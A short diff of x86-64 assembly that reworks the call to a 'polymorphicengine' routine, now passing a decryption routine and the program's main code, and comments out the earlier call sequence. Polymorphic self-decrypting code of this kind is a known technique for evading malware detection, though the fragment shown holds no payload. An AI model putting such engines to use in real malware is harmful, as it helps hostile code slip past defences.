@@ -52,14 +52,19 @@ _start:             ; Global entry point
 	mov rdi, r14
 	mov rsi, r15
 
-
-	; call polymorph engine
-	xor rbp, rbp
-	pop rdi
-	mov rsi, rsp
-	lea rdx, [rsp+rdi+8*8]
-	push rdi
+	mov rdi, decrypt
+	mov rsi, main
+	mov rax, decrypt.decryption_function
 	call polymorphicengine
+
+
+	; ; call polymorph engine
+	; xor rbp, rbp
+	; pop rdi
+	; mov rsi, rsp
+	; lea rdx, [rsp+rdi+8*8]
+	; push rdi
+	; call polymorphicengine
 	
 	; reload the initial program, state
 	mov rsp, rbx 
